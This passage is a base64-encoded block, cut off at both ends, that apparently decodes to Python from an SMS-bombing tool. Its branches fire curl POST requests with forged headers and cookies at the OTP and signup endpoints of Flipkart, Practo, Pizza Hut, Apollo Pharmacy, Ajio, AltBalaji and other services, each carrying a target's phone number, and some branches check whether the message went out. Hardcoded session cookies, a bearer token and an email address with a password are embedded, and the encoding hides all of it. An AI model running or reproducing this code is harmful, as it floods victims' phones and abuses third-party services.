3LWZvcm0tdXJsZW5jb2RlZCIgLUggIkhvc3Q6d3d3Lm9yaXlhbWF0cmltb255LmNvbSIgLUggIlJlZmVyZXI6aHR0cHM6Ly93d3cub3JpeWFtYXRyaW1vbnkuY29tLyIgLUggIlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgOC4xOyBXaW42NDsgeDY0OyBydjo1OS4wKSBHZWNrby8yMCBGaXJlZm94LzU2LjAiIC1IICJYLVJlcXVlc3RlZC1XaXRoOlhNTEh0dHBSZXF1ZXN0IiAtZCAiY291bnRyeWNvZGU9JyArCiAgICAgICAgICAgICAgICAgIGNjICsgJyZtb2JpbGVubz0nICsgcG4gKyAnIiAiaHR0cHM6Ly93d3cub3JpeWFtYXRyaW1vbnkuY29tL2xvZ2luL21vYmlsZWFwcHNtcy1ob21lcGFnZS5waHAiICA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxpZiBsaW0gPT0gNjoKICAgICAgICBvcy5zeXN0ZW0oCiAgICAgICAgICAgICdjdXJsIC1zIC1YIFBPU1QgLUggImhvc3Q6d3d3LmZsaXBrYXJ0LmNvbSIgLUggInVzZXItYWdlbnQ6TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NTguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC81OC4wIiAtSCAiYWNjZXB0OiovKiIgLUggImFjY2VwdC1sYW5ndWFnZTplbi1VUyxlbjtxPTAuNSIgLUggImFjY2VwdC1lbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggInJlZmVyZXI6aHR0cHM6Ly93d3cuZmxpcGthcnQuY29tLyIgLUggIngtdXNlci1hZ2VudDpNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjo1OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzU4LjAgRktVQS93ZWJzaXRlLzQxL3dlYnNpdGUvRGVza3RvcCIgLUggIm9yaWdpbjpodHRwczovL3d3dy5mbGlwa2FydC5jb20iIC1IICJjb25uZWN0aW9uOmtlZXAtYWxpdmUiIC1IICJDb250ZW50LVR5cGU6YXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIgLUggIkNvbnRlbnQtTGVuZ3RoOjUzIiAtZCBcJ3sibG9naW5JZCI6WyIrJyArIGNjICsgcG4gKyAnIl0sInN1cHBvcnRBbGxTdGF0ZXMiOnRydWV9XCcgImh0dHBzOi8vd3d3LmZsaXBrYXJ0LmNvbS9hcGkvNi91c2VyL3NpZ251cC9zdGF0dXMiICA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxpZiBsaW0gPT0gNzoKICAgICAgICBvcy5zeXN0ZW0oJ2N1cmwgLXMgLVggUE9TVCAtSCAiSG9zdDp3d3cuZmxpcGthcnQuY29tIiAtSCAiQ29ubmVjdGlvbjprZWVwLWFsaXZlIiAtSCAiQ29udGVudC1MZW5ndGg6NjAiIC1IICJYLXVzZXItYWdlbnQ6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzQuMC4zNzI5LjE1NyBTYWZhcmkvNTM3LjM2IEZLVUEvd2Vic2l0ZS80MS93ZWJzaXRlL0Rlc2t0b3AiIC1IICJPcmlnaW46aHR0cHM6Ly93d3cuZmxpcGthcnQuY29tIiAtSCAiU2F2ZS1EYXRhOm9uIiAtSCAiVXNlci1BZ2VudDpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83NC4wLjM3MjkuMTU3IFNhZmFyaS81MzcuMzYiIC1IICJDb250ZW50LVR5cGU6YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiAtSCAiQWNjZXB0OiovKiIgLUggIlJlZmVyZXI6aHR0cHM6Ly93d3cuZmxpcGthcnQuY29tLyIgLUggIkFjY2VwdC1FbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggIkFjY2VwdC1MYW5ndWFnZTplbi1JTixlbjtxPTAuOSxlbi1HQjtxPTAuOCxlbi1VUztxPTAuNyxoaTtxPTAuNiIgLUggIkNvb2tpZTpUPUJSJTNBY2p2cXpoZ2x1MW16dDk1YXlkemh2d3pxMS4xNTU4MDMxMDkyMDUwOyBTV0FCPWJ1aWxkLTQ0YmU5ZTQ3NDYxYTc0ZDczNzkxNDIwN2JjYmFmYzMwOyBsdXhfdWlkPTE1NTg2NzkwNDM4MTg5Mjk4NjsgQU1DVlNfMTdFQjQwMTA1M0RBRjQ4NDBBNDkwRDRDJTQwQWRvYmVPcmc9MTsgQU1DVl8xN0VCNDAxMDUzREFGNDg0MEE0OTBENEMlNDBBZG9iZU9yZz0tMjI3MTk2MjUxJTdDTUNJRFRTJTdDMTgwNDElN0NNQ01JRCU3QzYzMjczMzUzMDM1NTA5MzA0NTc2OTI3NzE5MjAzOTQ4OTMzMjQ2JTdDTUNBSUQlN0NOT05FJTdDTUNPUFRPVVQtMTU1ODY4NjI0NXMlN0NOT05FJTdDTUNBQU1MSC0xNTU5MjgzODQ1JTdDMTIlN0NNQ0FBTUItMTU1OTI4Mzg0NSU3Q2o4T2R2Nkxvbk40cjNhbjdMaEQzV1pyVTFiVXBBa0Zra2lZMW5jQlI5NnQyUFRJOyBzX2NjPXRydWU7IFNOPTIuVkk4MDg1QTZBMjM3RUI0QzYyODM2Qzg4MDlGMEQzMTJFQi5TSTIxQTlFQzRFOTlCOTQ5QjJBQ0U2MzYxQjNGMDIwOENDLlZTMTg3NjQ5QjJCMDZBNDRDNjk4MjQwMDY3MTBDQjZEODMuMTU1ODY3OTA3ODsgZ3B2X3BuPUhvbWVQYWdlOyBncHZfcG5fdD1Ib21lcGFnZTsgUz1kMXQxN0dRVnFQejlLUHpvYlAzTTRHUWtqUHkzNFRqZkp4STRTYlhWSXZod3ptM21FMTN2ZlNFdWxtZjkwRC83TDcxMHFVcE1xOG1BMGsyYng2YjJEdXdJUzRnPT07IHNfc3E9JTVCJTVCQiU1RCU1RCIgLWQgXCdsb2dpbklkPSsnICsgY2MgKyBwbiArICcmc3RhdGU9VkVSSUZJRUQmY2h1cm5FbWFpbFJlcXVlc3Q9ZmFsc2VcJyAiaHR0cHM6Ly93d3cuZmxpcGthcnQuY29tL2FwaS81L3VzZXIvb3RwL2dlbmVyYXRlIiAgPiAvZGV2L251bGwgMj4mMScpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGVsaWYgbGltID09IDg6CiAgICAgICAgb3Muc3lzdGVtKCdjdXJsIC1zIC1YIFBPU1QgLUggIkhvc3Q6d3d3LnJlZi1yLmNvbSIgLUggIlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NjUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82NS4wIiAtSCAiQWNjZXB0OmFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDEiIC1IICJBY2NlcHQtTGFuZ3VhZ2U6ZW4tVVMsZW47cT0wLjUiIC1IICJBY2NlcHQtRW5jb2Rpbmc6Z3ppcCwgZGVmbGF0ZSwgYnIiIC1IICJDb250ZW50LVR5cGU6YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IiAtSCAiWC1SZXF1ZXN0ZWQtV2l0aDpYTUxIdHRwUmVxdWVzdCIgLUggIkNvbnRlbnQtTGVuZ3RoOjI2IiAtSCAiRE5UOjEiIC1IICJDb25uZWN0aW9uOmtlZXAtYWxpdmUiIC1kICJtb2JpbGU9JyArIHBuICsgJyZzdWJtaXQ9MSZ1bmRlZmluZWQ9IiAiaHR0cHM6Ly93d3cucmVmLXIuY29tL2NsaWVudHMvbGVuc2thcnQvc21zQXBpIiAgPiAvZGV2L251bGwgMj4mMScpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGVsaWYgbGltID09IDk6CiAgICAgICAgcmQgPSBvcy5wb3BlbignY3VybCAtcyAtWCBQT1NUIC1IICJYLURST0lELVZFUlNJT046NC4xMi41IiAtSCAiQVBJLVZlcnNpb246Mi4wIiAtSCAidXNlci1hZ2VudDpzYW1zdW5nIFNNLUc5MzUwIDAgNC40LjIiIC1IICJjbGllbnQtdmVyc2lvbjpBbmRyb2lkLTQuMTIuNSIgLUggIlgtRFJPSUQtVkVSU0lPTi1DT0RFOjE1OCIgLUggIkFjY2VwdDphcHBsaWNhdGlvbi9qc29uIiAtSCAiY2xpZW50LW5hbWU6UHJhY3RvIEFuZHJvaWQgQXBwIiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIgLUggIkhvc3Q6YWNjb3VudHMucHJhY3RvLmNvbSIgLUggIkNvbm5lY3Rpb246S2VlcC1BbGl2ZSIgLUggIkNvbnRlbnQtTGVuZ3RoOjk2IiAtZCAgImNsaWVudF9uYW1lPVByYWN0bytBbmRyb2lkK0FwcCZmaW5nZXJwcmludD0mbW9iaWxlPSUyQicgKyBjYyArIHBuICsgJyZkZXZpY2VfbmFtZT1zYW1zdW5nK1NNLUc5MzUwJiIgICJodHRwczovL2FjY291bnRzLnByYWN0by5jb20vc2VuZF9vdHAiJykucmVhZCgpCiAgICAgICAgcmV0dXJuIHJkLmZpbmQoInN1Y2Nlc3MiKSAhPSAtMQogICAgZWxpZiBsaW0gPT0gMTA6CiAgICAgICAgb3Muc3lzdGVtKAogICAgICAgICAgICAnY3VybCAtcyAtWCBQT1NUIC1IICJIb3N0Om0ucGl6emFodXQuY28uaW4iIC1IICJjb250ZW50LWxlbmd0aDoxMTQiIC1IICJvcmlnaW46aHR0cHM6Ly9tLnBpenphaHV0LmNvLmluIiAtSCAiYXV0aG9yaXphdGlvbjpCZWFyZXIgWlhsS2FHSkhZMmxQYVVwSlZYcEpNVTVwU1hOSmJsSTFZME5KTmtscmNGaFdRMG81TG1WNVNtdFpXRkpvU1dwd04wbHVVblpoTWxaMVNXcHZhV0l6UVhoaVIwcHlaRWN4YkdSWVNUQk5XRUp5VGxSR05XTnFRakJrYlVac1NXbDNhVmxZVmpCaFEwazJTVzFXTlZOcVFteFhSVVp3VkRKc1MxTXhXWGhWVjJ4TlVUQndiMWxyWkdwaFZUbHdVMnRzVm1WcmEzaFViV3hMVDFNMWJHVlZjREZYVm1ONFlrZEdXRlZYYkZCaFZXdDNWR3RTYm1GVmVFUlRibVJxWWxkNE1GZFdhRXRPVm05NlUyNWFhMWRGU2paWlZtUlNZVlU1Y0ZOVVZsQlNNVVkwVkRCa1VrNUZNWEJOVjJ4YVZrWlZNVlJHVWxKT1ZUVlZXVE5TVUZZd01ERlVWMnQzWld4d2NWcDZWazVoYTBWNlYxWlNUazFHY0hGWFYyeE5VVEJ3ZDFsNlRrNWhWVGx3VTIwNWExTkdTak5VTW1zMFpHMVJlbHBFVGsxaVZFWnZXVEkxVTJOV2JGaFVia3BOWWxVMU1sbHNUVFZoTVhCWlYyMTRhVko2YkROWGJHaExZVWRPU0dFeWJFMVJNSEJ2V2taa1VtRlZPWEJUYlRsclUwWktNMVF5YXpSa2JWRjZXa1JPVFdKVVJtOVpNalZUWTFac1dGUnVTazFpVlRVeVdXeE5OV0V4Y0ZsWGJYaHBVbnBzTTFkc2FFdGhSMDVJWVRKc1RWRXdjSE5hVldoQ1lWVTVjVkpVUms5V1IzTXhWRzV3YWsxVk1VVlZXRTVLWWxSV2NGZHRiRXBPYXpGVlZsUkdVRlpIYzNwVVdIQnlaREExU1UxRE5WUmFNMXA0VW14T1psZHRUVE5hU0U1cFRWZFNOR0pXVmtka1NFRXhZVzVXTWs5Rk5UVldla0l5WkRFNVRWUnVUa0pOYldoR1ZrVjBla2xwZDJsa1dFSnJXVmhTYkZwRFNUWk5WRlV4VDFSck0wMTZhM2RPUkZVeFRubDNhV1JZVG14amEyeHJTV3B2YVUxRVFYZE5SRUYzVFVSQmRFMUVRWGROUXpCM1RVUkJkMHhVUVhkTlJFRjBUVVJCZDAxRVFYZE5SRUYzVFVSQmQwbHBkMmxhTWxaMVdsaEthR1JIVm10SmFtOTRUbFJWTlU5VVkzcFBWRUV3VGxSVk0yWlRkMmxoVjBZd1NXcHZlRTVVVlRWUFZHTjZUMVJCTUV4RFNteGxTRUZwVDJwRk1VNXFRVFJOZW1NMVRVUlNPUzVDTUdSMU5GbEVRVnB0VEdOVU0wWkhNMFJwU25ReE4zUnpSR2xKYVZaa1VGbDRaSEl5VnpsdGVuazQiIC1IICJ4LXNvdXJjZS1vcmlnaW46UFdBRlciIC1IICJjb250ZW50LXR5cGU6YXBwbGljYXRpb24vanNvbiIgLUggImFjY2VwdDphcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiIC1IICJ1c2VyLWFnZW50Ok1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgdml2byAxNzE4KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzQuMC4zNzI5LjE1NyBNb2JpbGUgU2FmYXJpLzUzNy4zNiIgLUggInNhdmUtZGF0YTpvbiIgLUggImxhbmd1YWdlY29kZTplbiIgLUggInJlZmVyZXI6aHR0cHM6Ly9tLnBpenphaHV0LmNvLmluL2xvZ2luIiAtSCAiYWNjZXB0LWVuY29kaW5nOmd6aXAsIGRlZmxhdGUsIGJyIiAtSCAiYWNjZXB0LWxhbmd1YWdlOmVuLUlOLGVuO3E9MC45LGVuLUdCO3E9MC44LGVuLVVTO3E9MC43LGhpO3E9MC42IiAtSCAiY29va2llOl9mYnA9ZmIuMi4xNTU5OTczOTA1MDgxLjE1MTYxNDQ5NjgiIC1IICJjb29raWU6X2dhdF9VQS0zNzg1ODE5Mi00PTEiIC1IICJjb29raWU6X2dhLXNzPTF8VUEtMzc4NTgxOTItNHxodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGIiAtSCAiY29va2llOl9naWQ9R0ExLjMuMTY2NjI5MDA4Mi4xNTU5OTczOTAyIiAtSCAiY29va2llOl9nYT1HQTEuMy4xODkzNDE2MDkyLjE1NTk5NzM5MDIiIC1IICJjb29raWU6cnVuX2Z1bGxzdG9yeV9mb3JfdXNlcj1mdWxsX3N0b3J5X2ZhaWwiIC1IICJjb29raWU6X2djbF9hdT0xLjEuMjAyMDM4NTExMC4xNTU5OTczOTAyIiAtSCAiY29va2llOkFLQV9BMj1BIiAtZCBcJ3siY3VzdG9tZXIiOnsiTW9iaWxlTm8iOiInICsgcG4gKyAnIiwiVXNlck5hbWUiOiInICsgcG4gKyAnIiwibWVyY2hhbnRJZCI6Ijk4ZDE4ZDgyLWJhNTktNDk1Ny05YzkyLTNmODkyMDdhMzRmNiJ9fVwnICJodHRwczovL20ucGl6emFodXQuY28uaW4vYXBpL2NhcnQvc2VuZC1vdHA/bGFuZ0NvZGU9ZW4iICA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxpZiBsaW0gPT0gMTE6CiAgICAgICAgb3Muc3lzdGVtKCdjdXJsIC1zIC1YIFBPU1QgLUggImhvc3Q6d3d3LmdvaWJpYm8uY29tIiAtSCAidXNlci1hZ2VudDpNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA4LjA7IFdpbjMyOyB4MzI7IHJ2OjU4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNTcuMCIgLUggImFjY2VwdDp0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgiIC1IICJhY2NlcHQtbGFuZ3VhZ2U6ZW4tVVMsZW47cT0wLjUiIC1IICJhY2NlcHQtZW5jb2Rpbmc6Z3ppcCwgZGVmbGF0ZSwgYnIiIC1IICJyZWZlcmVyOmh0dHBzOi8vd3d3LmdvaWJpYm8uY29tL21vYmlsZS8/c21zPXN1Y2Nlc3MiIC1IICJjb250ZW50LXR5cGU6YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiAtSCAiY29udGVudC1sZW5ndGg6MTQiIC1IICJjb25uZWN0aW9uOmtlZXAtYWxpdmUiIC1IICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzOjEiIC1kICJtYmw9JyArIHBuICsgJyIgImh0dHBzOi8vd3d3LmdvaWJpYm8uY29tL2NvbW1vbi9kb3dubG9hZHNtcy8iICA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxpZiBsaW0gPT0gMTI6CiAgICAgICAgb3MucG9wZW4oJ3JtIHRlbXAueHh4MSA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICBvcy5zeXN0ZW0oCiAgICAgICAgICAgICdjdXJsIC1zIC1YIFBPU1QgLUggIkhvc3Q6d3d3LmFwb2xsb3BoYXJtYWN5LmluIiAtSCAiY29udGVudC1sZW5ndGg6MTciIC1IICJhY2NlcHQ6Ki8qIiAtSCAib3JpZ2luOmh0dHBzOi8vd3d3LmFwb2xsb3BoYXJtYWN5LmluIiAtSCAieC1yZXF1ZXN0ZWQtd2l0aDpYTUxIdHRwUmVxdWVzdCIgLUggInNhdmUtZGF0YTpvbiIgLUggInVzZXItYWdlbnQ6TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyB2aXZvIDE3MTgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83NC4wLjM3MjkuMTU3IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiAtSCAiY29udGVudC10eXBlOmFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCIgLUggInJlZmVyZXI6aHR0cHM6Ly93d3cuYXBvbGxvcGhhcm1hY3kuaW4vc29jaWFsbG9naW4vbW9iaWxlL2xvZ2luLyIgLUggImFjY2VwdC1lbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggImFjY2VwdC1sYW5ndWFnZTplbi1JTixlbjtxPTAuOSxlbi1HQjtxPTAuOCxlbi1VUztxPTAuNyxoaTtxPTAuNiIgLUggImNvb2tpZTpfX2NmZHVpZD1kNjRjNjVhMmVkYWQ1NDA4NjM4Mjc1OWNkZjU5OWRlOTAxNTU4Njg2NjE1IiAtSCAiY29va2llOl9nYT1HQTEuMi4xMjc4OTA4ODAzLjE1NTg2ODY2MjEiIC1IICJjb29raWU6X190YV9kZXZpY2U9ZkF6OGVBOVJ4NDB5eUlpQjVtenZIdDRhcEZhU2tNQkEiIC1IICJjb29raWU6X2ZicD1mYi4xLjE1NTg2ODY2MjcxMjcuNjU1NDU0NjE4IiAtSCAiY29va2llOl9fc3RhdD0iQkxPQ0siIiAtSCAiY29va2llOmp2X3Zpc2l0c19jb3VudF9FWFJLTkl6RmtWPTEiIC1IICJjb29raWU6X19zdHA9eyJ2aXNpdCI6InJldHVybmluZyIsInV1aWQiOiJkOWExYzM5ZC1lZmJkLTQ5MTEtYWMwZS02MzMzNDU1ZjlmYmIifSIgLUggImNvb2tpZTpQSFBTRVNTSUQ9dm5qMmh2azhuZ2E0djFtMmh2bG12bDg4cjQiIC1IICJjb29raWU6X2dpZD1HQTEuMi4xMzI2Njg3MjYuMTU2MDIzOTcxNSIgLUggImNvb2tpZTpfZ2F0PTEiIC1IICJjb29raWU6X190YV92aXNpdD1mNXV2cFlLdThFVm1KQUptRkdYTW1YR1NUaU5RU1dSUyIgLUggImNvb2tpZTpfZ2F0X1VBLTMxMTQyODU1LTE9MSIgLUggImNvb2tpZTpfX3RhX3Bpbmc9MSIgLUggImNvb2tpZTptYWdlLWNhY2hlLXN0b3JhZ2U9JTdCJTdEIiAtSCAiY29va2llOm1hZ2UtY2FjaGUtc3RvcmFnZS1zZWN0aW9uLWludmFsaWRhdGlvbj0lN0IlN0QiIC1IICJjb29raWU6bWFnZS1jYWNoZS1zZXNzaWQ9dHJ1ZSIgLUggImNvb2tpZTptYWdlLW1lc3NhZ2VzPSIgLUggImNvb2tpZTpwcml2YXRlX2NvbnRlbnRfdmVyc2lvbj00NmU2Yzg2MTFhOWIwZDA2ZTY2MmRhNTBjYTVjZjMxMSIgLUggImNvb2tpZTpBV1NBTEI9MjE3N1FIalhYckZnYWVtMXcwRnJCcVoyYW9Lck1oSStEaWJvbEphZWU5Y1ZPUDRaU1YyTGlMQzN0a3M2OHVkNEVSQ3lkeGE4a2I0a2xiaUkrVkVuTlFCMHJzeWluczFVU2d2SGNQT1VvejJueVNOM1NDNUcvd3BBQUNJcSIgLUggImNvb2tpZTpzZWN0aW9uX2RhdGFfaWRzPSU3QiUyMmNhcnQlMjIlM0ExNTYwMjM5NzUxJTdEIiAtZCBcJ21vYmlsZT0nICsgcG4gKyAnXCcgImh0dHBzOi8vd3d3LmFwb2xsb3BoYXJtYWN5LmluL3NvY2lhbGxvZ2luL21vYmlsZS9zZW5kb3RwLyIgLS1vdXRwdXQgdGVtcC54eHgxJykKICAgICAgICB3aGlsZSBub3Qgb3MucGF0aC5leGlzdHMoJ3RlbXAueHh4MScpOgogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgICAgICByZCA9IHN0cihvcGVuKCd0ZW1wLnh4eDEnLCAncmInKS5yZWFkKCkpICsgIiAiCiAgICAgICAgcmV0dXJuIHJkLmZpbmQoInNlbnQiKSAhPSAtMQogICAgZWxpZiBsaW0gPT0gMTM6CiAgICAgICAgcmQgPSAnICcKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJkID0gb3MucG9wZW4oCiAgICAgICAgICAgICAgICAnIGN1cmwgLXMgLVggUE9TVCAtSCAiSG9zdDp3d3cuYWppby5jb20iIC1IICJDb25uZWN0aW9uOmtlZXAtYWxpdmUiIC1IICJDb250ZW50LUxlbmd0aDoxNDQiIC1IICJBY2NlcHQ6YXBwbGljYXRpb24vanNvbiIgLUggIk9yaWdpbjpodHRwczovL3d3dy5hamlvLmNvbSIgLUggIlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyB2aXZvIDE3MTgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83NC4wLjM3MjkuMTU3IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiAtSCAiY29udGVudC10eXBlOmFwcGxpY2F0aW9uL2pzb24iIC1IICJSZWZlcmVyOmh0dHBzOi8vd3d3LmFqaW8uY29tL3NpZ251cCIgLUggIkFjY2VwdC1FbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggIkFjY2VwdC1MYW5ndWFnZTplbi1JTixlbjtxPTAuOSxlbi1HQjtxPTAuOCxlbi1VUztxPTAuNyxoaTtxPTAuNiIgLUggIkNvb2tpZTpfZ2E9R0ExLjIuOTc5OTI4MzE5LjE1NjAzNjQwNzE7IF9naWQ9R0ExLjIuNjY2MjcwMjE2LjE1NjAzNjQwNzE7IFY9MjAxOyBfZmJwPWZiLjEuMTU2MDM2NDA3NjkxMy4xNTI4MzQ5NzI1OyBjdG9fbHdpZD1kOTFiZWEzYS03NjEwLTQ1YWEtOGY3OC02NWEwZDc0MGZiNDY7IFB1c2hTdWJzY3JpYmVyU3RhdHVzPURFTklFRDsgcGVjbG9zZWQ9dHJ1ZTsgR19FTkFCTEVEX0lEUFM9Z29vZ2xlOyBUUzAxOGNjNTkzPTAxZWY2MWFlZDBmY2ExMTBmNTBkOGUzYmUyYzY2ZWI4MzE4OGY2ZGY4NDk1YzBlZDJjZDc3MjgyOTM3MGZjMTI2OTA5NTRhYWQwODM0ZjU0NWI1Nzc2NDQ2N2RiYjY2ZWZiMDVkNDgxYTg5NThhZWJiMjczNzUxOTU2ZWY5ZWIzODNhM2JhMjJkZDFjOTRkODIwMjFlOWQ0YzQwMDExZDRhYjliZDk3YzZmMGE3NDYyOGFjMTJlOGY3YmNiNjYzYzE2MDhlNzI4OGViZDI1MjA1MWNiODRkZWYzYjAyMWQzYmNmNjQzZDNmMzcyOGNhOWMwZDljNzgwZDE3MTU3OGJhOTY2Nzc0ZjExYWM0NDg2NGE3ZjNkYTU5NzkxY2I1NWYyNzQxZjIzZDcyZjc4NDNlZmU5MzA2NDU5YzAwZWMyZTVmMDAwNjU3MjlhODU3M2JhYmE0MjM4NGJiN2NmNDZlYjU1Y2Y4OWY3MmYxZGNkNTYxOWEyNmU0ZmYzMmM2M2QwNmNhYzhjNGJiMTU4ZGE2NjQwYmMwYjExMTkzMTM0Y2JmMzgwNTBhZTBkYjIzMGFhMjU4YjExODE3NDlmYjAzNzNhZmUwNDFhZDFhZWZmZDBjMDhiZTdhNjIwMTBkYjAyY2M2NWVkZmIxMzQxZDJkZTU0Y2RmNDc1YzVkY2Q4NGUxNmM2NGM1MDsgX2dhY19VQS02ODAwMjAzMC0xPTEuMTU2MDM2NjE5Ny5DajBLQ1Fqd3hZTG9CUkN4QVJJc0FFZjE2LXR4NVVYcnJQOVNFaFI4ZFBrVEw0YTl3b0VGN0FlLWt2U2x6S2RncTM1eTMxRGVLM191aGc4YUFrUkJFQUx3X3djQjsgY2RpZ2lNcmt0PXV0bV9zb3VyY2UlM0ElN0N1dG1fbWVkaXVtJTNBJTdDZGV2aWNlJTNBbW9iaWxlJTdDZXhwaXJlcyUzQUZyaSUyQyUyMDEyJTIwSnVsJTIwMjAxOSUyMDE5JTNBMDMlM0ExNyUyMEdNVCU3QzsgSW1wcmVzc2lvbkNvb2tpZT00OyBpcD0xMC4xLjEwLjE7IHNlc3Npb25TdGF0dXM9dHJ1ZXx1bmRlZmluZWQ7IEZpcnN0UGFnZT1UaHUgSnVuIDEzIDIwMTkgMDA6MzM6NTMgR01UKzA1MzAgKEluZGlhIFN0YW5kYXJkIFRpbWUpOyBfZGNfZ3RtX1VBLTY4MDAyMDMwLTE9MTsgdUk9am9obnlhaG8lNDBnbWFpbC5jb207IFRTMDFmZTQyNDk9MDFlZjYxYWVkMDljMzJjNmE1M2NlOWU0MzFhNmE3MTljNDE2ODY3ZjJmM2FkNzEzZmRlMmU3NDE3NWJjMjQ4YWNjN2E1MjNmNDFlOTc1MWQwMzI4NTlhMTU5YmZmZjg3NjY0YjkwYzNkMGE5ZGZiMjM5MmY3NTg3NmNjYmUyNzNiOGE4ZTgxZDdhOGQyNTA0NzQ1M2MxN2EyOTA1ZWNhN2VmZjI2Yjc4MGMiIC1kIFwneyJmaXJzdE5hbWUiOiJSb3giLCJsb2dpbiI6ImpvaG55YWhvQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiUm9ja0A1c3RhciIsImdlbmRlclR5cGUiOiJNYWxlIiwibW9iaWxlTnVtYmVyIjoiJyArIHBuICsgJyIsInJlcXVlc3RUeXBlIjoiU0VORE9UUCJ9XCcgImh0dHBzOi8vd3d3LmFqaW8uY29tL2FwaS9hdXRoL3NpZ251cFNlbmRPVFAiICcpLnJlYWQoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgaWYgcmQuZmluZCgiXCJzdGF0dXNDb2RlXCI6XCIxXCIiKSAhPSAtMToKICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICBlbHNlOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgIGVsaWYgbGltID09IDE0OgogICAgICAgIGNvbiA9ICd7ImNvdW50cnlfY29kZSI6IicgKyBjYyArICciLCJwaG9uZV9udW1iZXIiOiInICsgcG4gKyAnIn0nCiAgICAgICAgb3MucG9wZW4oJ3JtIHRlbXAueHh4MiA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICBvcy5zeXN0ZW0oJ2N1cmwgLXMgLVggUE9TVCAtSCAiSG9zdDphcGkuY2xvdWQuYWx0YmFsYWppLmNvbSIgLUggIkNvbm5lY3Rpb246a2VlcC1hbGl2ZSIgLUggIkNvbnRlbnQtTGVuZ3RoOicgKyBzdHIobGVuKGNvbikpICsKICAgICAgICAgICAgICAgICAgJyIgLUggIkFjY2VwdDphcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiIC1IICJPcmlnaW46aHR0cHM6Ly9saXRlLmFsdGJhbGFqaS5jb20iIC1IICJTYXZlLURhdGE6b24iIC1IICJVc2VyLUFnZW50Ok1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgdml2byAxNzE4KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzUuMC4zNzcwLjg5IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOCIgLUggIlJlZmVyZXI6aHR0cHM6Ly9saXRlLmFsdGJhbGFqaS5jb20vc3Vic2NyaWJlP3Byb2dyZXNzPWlucHV0IiAtSCAiQWNjZXB0LUVuY29kaW5nOmd6aXAsIGRlZmxhdGUsIGJyIiAtSCAiQWNjZXB0LUxhbmd1YWdlOmVu